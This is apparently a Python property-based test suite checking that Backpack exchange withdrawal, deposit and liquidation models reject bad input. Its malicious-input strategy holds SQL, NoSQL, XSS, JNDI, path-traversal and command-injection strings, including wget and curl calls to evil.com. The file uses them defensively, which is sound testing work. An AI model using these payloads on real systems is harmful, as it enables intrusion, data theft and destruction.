"""Property-based tests for Backpack raw transfer models.

These tests validate critical security boundary models that process external transfer data.
The models tested here are essential for deposit/withdrawal processing, liquidation handling,
and tracking.

SECURITY CRITICAL: These raw models protect against:
- Malicious transfer data that could manipulate financial records
- Financial precision errors in deposit/withdrawal amounts
- Buffer overflow attacks through oversized transfer values
- Injection attacks through malformed transfer structures
- Status manipulation that could affect transfer processing
- ID manipulation that could affect transaction tracking

Property testing ensures comprehensive coverage of transfer edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_transfer import (
    BackpackRawDeposit,
    BackpackRawLiquidation,
    BackpackRawWithdrawal,
)
from cyberdelta.exceptions.field_validation import TypeFieldError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR TRANSFER MODEL TESTING
# =============================================================================


def transfer_amount_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for transfer amounts.

    Returns:
        SearchStrategy generating valid decimal strings for transfer amounts.
    """
    return st.one_of([
        # Common transfer amounts
        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=6).map(str),
        # Specific amounts
        st.just("0"),  # Zero amount
        st.just("0.0"),  # Zero with decimal
        st.just("100.0"),  # Standard amount
        st.just("0.5"),  # Fractional BTC
        st.just("1000.123456"),  # USDC with precision
        st.just("0.00000001"),  # Minimum precision
        st.just("99999999.99999999"),  # Large amount
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def transfer_id_strategy() -> SearchStrategy[str]:
    """Generate valid transfer IDs.

    Returns:
        SearchStrategy generating valid transfer ID strings.
    """
    return st.one_of([
        # Common patterns
        st.just("wd_123"),
        st.just("dp_456"),
        st.just("liq_789"),
        st.text(
            min_size=3,
            max_size=20,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ).filter(lambda x: x and not x.startswith("_") and not x.endswith("_")),
        # Real-world patterns
        st.just("withdrawal_999999999999999999"),
        st.just("deposit_123456789"),
        st.just("liquidation_abcdef123456"),
        # UUID-like patterns
        st.text(
            min_size=8,
            max_size=36,
            alphabet=st.characters(whitelist_categories=["Nd"], whitelist_characters="abcdef-"),
        ).filter(lambda x: x and len(x.encode("utf-8")) <= 64),
    ])


def asset_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid asset symbols.

    Returns:
        SearchStrategy generating valid asset symbol strings.
    """
    return st.one_of([
        # Common assets
        st.just("BTC"),
        st.just("ETH"),
        st.just("SOL"),
        st.just("USDC"),
        st.just("USDT"),
        st.just("AVAX"),
        # Generated symbols
        st.text(
            min_size=2, max_size=10, alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"])
        ).filter(lambda x: x and x.isalnum()),
        # Edge cases
        st.just("A"),  # Single character
        st.just("VERYLONGASSETNAME"),  # Longer asset
    ])


def transfer_status_strategy() -> SearchStrategy[str]:
    """Generate valid transfer status values.

    Returns:
        SearchStrategy generating valid transfer status strings.
    """
    return st.sampled_from([
        "pending",
        "completed",
        "failed",
        "cancelled",
        "processing",
        "confirmed",
    ])


def liquidation_side_strategy() -> SearchStrategy[str]:
    """Generate valid liquidation side values.

    Returns:
        SearchStrategy generating valid liquidation side strings.
    """
    return st.sampled_from([
        "buy",
        "sell",
    ])


def trading_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid trading symbols for liquidations.

    Returns:
        SearchStrategy generating valid trading symbol strings.
    """
    return st.one_of([
        # Common trading pairs
        st.just("BTC_USDC"),
        st.just("ETH_USDC"),
        st.just("SOL_USDC"),
        st.just("BTC_USDT"),
        st.just("ETH_USDT"),
        # Generated symbols
        st.text(
            min_size=5,
            max_size=15,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_"
            ),
        ).filter(lambda x: x and "_" in x and not x.startswith("_") and not x.endswith("_")),
        # Edge cases
        st.just("A_B"),  # Minimum length
        st.just("VERYLONGSYMBOL_USDC"),  # Longer symbol
    ])


@st.composite
def valid_withdrawal_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid withdrawal data.

    Returns:
        Dictionary with valid withdrawal data fields.
    """
    return {
        "id": draw(transfer_id_strategy()),
        "asset": draw(asset_symbol_strategy()),
        "amount": draw(transfer_amount_strategy()),
        "status": draw(transfer_status_strategy()),
    }


@st.composite
def valid_deposit_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid deposit data.

    Returns:
        Dictionary with valid deposit data fields.
    """
    return {
        "id": draw(transfer_id_strategy()),
        "asset": draw(asset_symbol_strategy()),
        "amount": draw(transfer_amount_strategy()),
        "status": draw(transfer_status_strategy()),
    }


@st.composite
def valid_liquidation_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid liquidation data.

    Returns:
        Dictionary with valid liquidation data fields.
    """
    return {
        "symbol": draw(trading_symbol_strategy()),
        "price": draw(transfer_amount_strategy()),
        "quantity": draw(transfer_amount_strategy()),
        "side": draw(liquidation_side_strategy()),
    }


def malicious_transfer_strategy() -> SearchStrategy[object]:
    """Generate malicious values for transfer security testing.

    Returns:
        SearchStrategy generating malicious values for security testing.
    """
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-transfers}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('transfer-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE transfers;--"),
        st.just("1' UNION SELECT * FROM withdrawals--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("T" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.transfers.find(); //"),
        # JSON injection
        st.just('{"$where": "this.amount > 1000000"}'),
        # Transfer manipulation
        st.just("100.0'; UPDATE transfers SET amount=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW WITHDRAWAL MODEL
# =============================================================================


class TestBackpackRawWithdrawalProperties:
    """Property-based tests for BackpackRawWithdrawal validation and security."""

    @given(withdrawal_data=valid_withdrawal_data())
    def test_withdrawal_validation_success_properties(
        self, withdrawal_data: dict[str, Any]
    ) -> None:
        """Property: Valid withdrawal data should always create valid objects."""
        # Skip invalid decimal values
        try:
            decimal_val = Decimal(withdrawal_data["amount"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        for field in ["id", "asset", "status"]:
            value = withdrawal_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 64)

        obj = BackpackRawWithdrawal.model_validate(withdrawal_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawWithdrawal)

        # Property: All fields should be preserved with correct types
        assert obj.id == withdrawal_data["id"]
        assert obj.asset == withdrawal_data["asset"]
        assert obj.amount == withdrawal_data["amount"]
        assert obj.status == withdrawal_data["status"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["id", "asset", "amount", "status"]),
        malicious_value=malicious_transfer_strategy(),
    )
    def test_withdrawal_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Withdrawal model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "id": "wd_123",
            "asset": "USDC",
            "amount": "100.0",
            "status": "pending",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            BackpackRawWithdrawal.model_validate(base_data)

    @given(
        amount_value=st.one_of([
            # Valid amounts
            st.just("0"),
            st.just("100.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            # Invalid amounts
            st.just("-100.0"),  # Negative
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ])
    )
    def test_withdrawal_amount_validation_properties(self, amount_value: str) -> None:
        """Property: Withdrawal amount field should validate properly."""
        withdrawal_data = {
            "id": "wd_123",
            "asset": "USDC",
            "amount": amount_value,
            "status": "pending",
        }

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(amount_value.strip() if amount_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not amount_value.strip()

            if is_finite and not is_empty and decimal_val >= 0:
                # Property: Valid finite non-negative amounts should be accepted
                obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
                assert obj.amount == amount_value
            else:
                # Property: Non-finite, empty, or negative values should be rejected
                with pytest.raises(ValidationError):
                    BackpackRawWithdrawal.model_validate(withdrawal_data)

        except (ValueError, TypeError):
            # Property: Unparseable amount strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawWithdrawal.model_validate(withdrawal_data)

    @given(withdrawal_data=valid_withdrawal_data())
    def test_withdrawal_immutability_properties(self, withdrawal_data: dict[str, Any]) -> None:
        """Property: Withdrawal objects should be immutable after creation."""
        # Skip invalid data
        try:
            decimal_val = Decimal(withdrawal_data["amount"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
            for field in ["id", "asset", "status"]:
                assume(isinstance(withdrawal_data[field], str) and withdrawal_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawWithdrawal.model_validate(withdrawal_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.id = "new_id"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.amount = "200.0"

    @given(withdrawal_data=valid_withdrawal_data())
    def test_withdrawal_financial_precision_properties(
        self, withdrawal_data: dict[str, Any]
    ) -> None:
        """Property: Withdrawal model should preserve financial precision exactly."""
        # Only test valid finite decimals
        try:
            decimal_val = Decimal(withdrawal_data["amount"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
            for field in ["id", "asset", "status"]:
                assume(isinstance(withdrawal_data[field], str) and withdrawal_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawWithdrawal.model_validate(withdrawal_data)

        # Property: Amount should be preserved exactly as string
        assert obj.amount == withdrawal_data["amount"]


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW DEPOSIT MODEL
# =============================================================================


class TestBackpackRawDepositProperties:
    """Property-based tests for BackpackRawDeposit validation and security."""

    @given(deposit_data=valid_deposit_data())
    def test_deposit_validation_success_properties(self, deposit_data: dict[str, Any]) -> None:
        """Property: Valid deposit data should always create valid BackpackRawDeposit objects."""
        # Skip invalid decimal values
        try:
            decimal_val = Decimal(deposit_data["amount"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        for field in ["id", "asset", "status"]:
            value = deposit_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 64)

        obj = BackpackRawDeposit.model_validate(deposit_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawDeposit)

        # Property: All fields should be preserved with correct types
        assert obj.id == deposit_data["id"]
        assert obj.asset == deposit_data["asset"]
        assert obj.amount == deposit_data["amount"]
        assert obj.status == deposit_data["status"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["id", "asset", "amount", "status"]),
        malicious_value=malicious_transfer_strategy(),
    )
    def test_deposit_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Deposit model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "id": "dp_456",
            "asset": "BTC",
            "amount": "0.5",
            "status": "completed",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            BackpackRawDeposit.model_validate(base_data)

    @given(deposit_data=valid_deposit_data())
    def test_deposit_immutability_properties(self, deposit_data: dict[str, Any]) -> None:
        """Property: Deposit objects should be immutable after creation."""
        # Skip invalid data
        try:
            decimal_val = Decimal(deposit_data["amount"])
            assume(decimal_val.is_finite() and decimal_val >= 0)
            for field in ["id", "asset", "status"]:
                assume(isinstance(deposit_data[field], str) and deposit_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawDeposit.model_validate(deposit_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.id = "new_id"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.amount = "1.0"


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW LIQUIDATION MODEL
# =============================================================================


class TestBackpackRawLiquidationProperties:
    """Property-based tests for BackpackRawLiquidation validation and security."""

    @given(liquidation_data=valid_liquidation_data())
    def test_liquidation_validation_success_properties(
        self, liquidation_data: dict[str, Any]
    ) -> None:
        """Property: Valid liquidation data should always create valid objects."""
        # Skip invalid decimal values
        try:
            for field in ["price", "quantity"]:
                decimal_val = Decimal(liquidation_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        for field in ["symbol", "side"]:
            value = liquidation_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 64)

        obj = BackpackRawLiquidation.model_validate(liquidation_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawLiquidation)

        # Property: All fields should be preserved with correct types
        assert obj.symbol == liquidation_data["symbol"]
        assert obj.price == liquidation_data["price"]
        assert obj.quantity == liquidation_data["quantity"]
        assert obj.side == liquidation_data["side"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["symbol", "price", "quantity", "side"]),
        malicious_value=malicious_transfer_strategy(),
    )
    def test_liquidation_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Liquidation model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "symbol": "BTC_USDC",
            "price": "45000.0",
            "quantity": "0.01",
            "side": "sell",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            BackpackRawLiquidation.model_validate(base_data)

    @given(
        decimal_field=st.sampled_from(["price", "quantity"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("1000.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            # Invalid decimals
            st.just("-45000.0"),  # Negative
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_liquidation_decimal_validation_properties(
        self, decimal_field: str, decimal_value: str
    ) -> None:
        """Property: Liquidation decimal fields should validate properly."""
        liquidation_data = {
            "symbol": "BTC_USDC",
            "price": "45000.0",
            "quantity": "0.01",
            "side": "sell",
        }
        liquidation_data[decimal_field] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty and decimal_val >= 0:
                # Property: Valid finite non-negative decimals should be accepted
                obj = BackpackRawLiquidation.model_validate(liquidation_data)
                field_value = getattr(obj, decimal_field)
                assert field_value == decimal_value
            else:
                # Property: Non-finite, empty, or negative values should be rejected
                with pytest.raises(ValidationError):
                    BackpackRawLiquidation.model_validate(liquidation_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawLiquidation.model_validate(liquidation_data)

    @given(liquidation_data=valid_liquidation_data())
    def test_liquidation_immutability_properties(self, liquidation_data: dict[str, Any]) -> None:
        """Property: Liquidation objects should be immutable after creation."""
        # Skip invalid data
        try:
            for field in ["price", "quantity"]:
                decimal_val = Decimal(liquidation_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
            for field in ["symbol", "side"]:
                assume(isinstance(liquidation_data[field], str) and liquidation_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawLiquidation.model_validate(liquidation_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.symbol = "ETH_USDC"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.quantity = "0.1"


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestBackpackRawTransferIntegrationProperties:
    """Integration property tests for transfer models working together."""

    @given(
        withdrawal_data=valid_withdrawal_data(),
        deposit_data=valid_deposit_data(),
        liquidation_data=valid_liquidation_data(),
    )
    def test_transfer_models_integration_properties(
        self,
        withdrawal_data: dict[str, Any],
        deposit_data: dict[str, Any],
        liquidation_data: dict[str, Any],
    ) -> None:
        """Property: All transfer models should work consistently together."""
        # Use same asset for withdrawal and deposit
        common_asset = "USDC"
        withdrawal_data["asset"] = common_asset
        deposit_data["asset"] = common_asset

        # Skip invalid data
        try:
            # Validate all amount fields
            for field in ["amount"]:
                withdraw_val = Decimal(withdrawal_data[field])
                deposit_val = Decimal(deposit_data[field])
                assume(withdraw_val.is_finite() and withdraw_val >= 0)
                assume(deposit_val.is_finite() and deposit_val >= 0)
            for field in ["price", "quantity"]:
                liq_val = Decimal(liquidation_data[field])
                assume(liq_val.is_finite() and liq_val >= 0)

            # Validate string constraints
            for field in ["id", "status"]:
                assume(isinstance(withdrawal_data[field], str) and withdrawal_data[field].strip())
                assume(isinstance(deposit_data[field], str) and deposit_data[field].strip())
            for field in ["symbol", "side"]:
                assume(isinstance(liquidation_data[field], str) and liquidation_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        # Property: All models should be created successfully with consistent asset
        withdrawal_obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
        deposit_obj = BackpackRawDeposit.model_validate(deposit_data)
        liquidation_obj = BackpackRawLiquidation.model_validate(liquidation_data)

        # Property: Withdrawal and deposit should have the same asset
        assert withdrawal_obj.asset == common_asset
        assert deposit_obj.asset == common_asset

        # Property: All objects should be properly typed
        assert isinstance(withdrawal_obj, BackpackRawWithdrawal)
        assert isinstance(deposit_obj, BackpackRawDeposit)
        assert isinstance(liquidation_obj, BackpackRawLiquidation)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from([
                "id",
                "asset",
                "amount",
                "status",
                "symbol",
                "price",
                "quantity",
                "side",
            ]),
            malicious_transfer_strategy(),
            min_size=3,
            max_size=8,
        )
    )
    def test_transfer_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All transfer models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected by all models

        # Test BackpackRawWithdrawal
        if all(key in complete_malicious_data for key in ["id", "asset", "amount", "status"]):
            with pytest.raises((ValidationError, TypeError, TypeFieldError)):
                BackpackRawWithdrawal.model_validate({
                    "id": complete_malicious_data["id"],
                    "asset": complete_malicious_data["asset"],
                    "amount": complete_malicious_data["amount"],
                    "status": complete_malicious_data["status"],
                })

        # Test BackpackRawDeposit
        if all(key in complete_malicious_data for key in ["id", "asset", "amount", "status"]):
            with pytest.raises((ValidationError, TypeError, TypeFieldError)):
                BackpackRawDeposit.model_validate({
                    "id": complete_malicious_data["id"],
                    "asset": complete_malicious_data["asset"],
                    "amount": complete_malicious_data["amount"],
                    "status": complete_malicious_data["status"],
                })

        # Test BackpackRawLiquidation
        if all(key in complete_malicious_data for key in ["symbol", "price", "quantity", "side"]):
            with pytest.raises((ValidationError, TypeError, TypeFieldError)):
                BackpackRawLiquidation.model_validate({
                    "symbol": complete_malicious_data["symbol"],
                    "price": complete_malicious_data["price"],
                    "quantity": complete_malicious_data["quantity"],
                    "side": complete_malicious_data["side"],
                })

    @given(
        transfer_status=transfer_status_strategy(), malicious_amount=malicious_transfer_strategy()
    )
    def test_transfer_status_consistency_properties(
        self, transfer_status: str, malicious_amount: object
    ) -> None:
        """Property: Transfer status should be consistent across withdrawal and deposit models."""
        # Property: Valid status should work for both models
        withdrawal_data: dict[str, object] = {
            "id": "wd_test",
            "asset": "USDC",
            "amount": "100.0",
            "status": transfer_status,
        }
        deposit_data: dict[str, object] = {
            "id": "dp_test",
            "asset": "USDC",
            "amount": "100.0",
            "status": transfer_status,
        }

        # Property: Same status should be accepted by both models
        withdrawal_obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
        deposit_obj = BackpackRawDeposit.model_validate(deposit_data)

        assert withdrawal_obj.status == transfer_status
        assert deposit_obj.status == transfer_status

        # Property: Malicious amounts should be rejected by both models
        withdrawal_data["amount"] = malicious_amount
        deposit_data["amount"] = malicious_amount

        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            BackpackRawWithdrawal.model_validate(withdrawal_data)

        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            BackpackRawDeposit.model_validate(deposit_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawWithdrawal_real_world_example() -> None:
    """Test with real-world withdrawal data."""
    payload = {
        "id": "wd_123",
        "asset": "USDC",
        "amount": "100.0",
        "status": "pending",
    }
    obj = BackpackRawWithdrawal.model_validate(payload)
    assert obj.id == "wd_123"
    assert obj.asset == "USDC"
    assert obj.amount == "100.0"
    assert obj.status == "pending"


def test_BackpackRawDeposit_real_world_example() -> None:
    """Test with real-world deposit data."""
    payload = {
        "id": "dp_456",
        "asset": "BTC",
        "amount": "0.5",
        "status": "completed",
    }
    obj = BackpackRawDeposit.model_validate(payload)
    assert obj.id == "dp_456"
    assert obj.asset == "BTC"
    assert obj.amount == "0.5"
    assert obj.status == "completed"


def test_BackpackRawLiquidation_real_world_example() -> None:
    """Test with real-world liquidation data."""
    payload = {
        "symbol": "BTC_USDC",
        "price": "45000.0",
        "quantity": "0.01",
        "side": "sell",
    }
    obj = BackpackRawLiquidation.model_validate(payload)
    assert obj.symbol == "BTC_USDC"
    assert obj.price == "45000.0"
    assert obj.quantity == "0.01"
    assert obj.side == "sell"


def test_BackpackRawWithdrawal_edge_case_example() -> None:
    """Test with edge case withdrawal data."""
    payload = {
        "id": "withdrawal_999999999999999999",
        "asset": "USDC_😀",
        "amount": "0.00000001",
        "status": "completed",
    }
    obj = BackpackRawWithdrawal.model_validate(payload)
    assert obj.asset == "USDC_😀"
    assert obj.amount == "0.00000001"
    assert obj.status == "completed"


def test_BackpackRawDeposit_edge_case_example() -> None:
    """Test with edge case deposit data."""
    payload = {
        "id": "deposit_999999999999999999",
        "asset": "BTC_😀",
        "amount": "99999999.99999999",
        "status": "pending",
    }
    obj = BackpackRawDeposit.model_validate(payload)
    assert obj.asset == "BTC_😀"
    assert obj.amount == "99999999.99999999"
    assert obj.status == "pending"


def test_BackpackRawLiquidation_edge_case_example() -> None:
    """Test with edge case liquidation data."""
    payload = {
        "symbol": "BTC_USDC_😀",
        "price": "0.00000001",
        "quantity": "99999999.99999999",
        "side": "buy",
    }
    obj = BackpackRawLiquidation.model_validate(payload)
    assert obj.symbol == "BTC_USDC_😀"
    assert obj.price == "0.00000001"
    assert obj.quantity == "99999999.99999999"
    assert obj.side == "buy"


def test_BackpackRawWithdrawal_zero_amount_example() -> None:
    """Test with zero amount withdrawal."""
    payload = {
        "id": "wd_zero",
        "asset": "USDC",
        "amount": "0",
        "status": "cancelled",
    }
    obj = BackpackRawWithdrawal.model_validate(payload)
    assert obj.amount == "0"
    assert obj.status == "cancelled"


def test_BackpackRawDeposit_scientific_notation_example() -> None:
    """Test with scientific notation amount."""
    payload = {
        "id": "dp_scientific",
        "asset": "ETH",
        "amount": "2e-3",
        "status": "confirmed",
    }
    obj = BackpackRawDeposit.model_validate(payload)
    assert obj.amount == "2e-3"
    assert obj.status == "confirmed"


def test_BackpackRawLiquidation_large_values_example() -> None:
    """Test with large price and quantity values."""
    payload = {
        "symbol": "ETH_USDT",
        "price": "1000000.123456",
        "quantity": "1000.789012",
        "side": "sell",
    }
    obj = BackpackRawLiquidation.model_validate(payload)
    assert obj.symbol == "ETH_USDT"
    assert obj.price == "1000000.123456"
    assert obj.quantity == "1000.789012"
    assert obj.side == "sell"
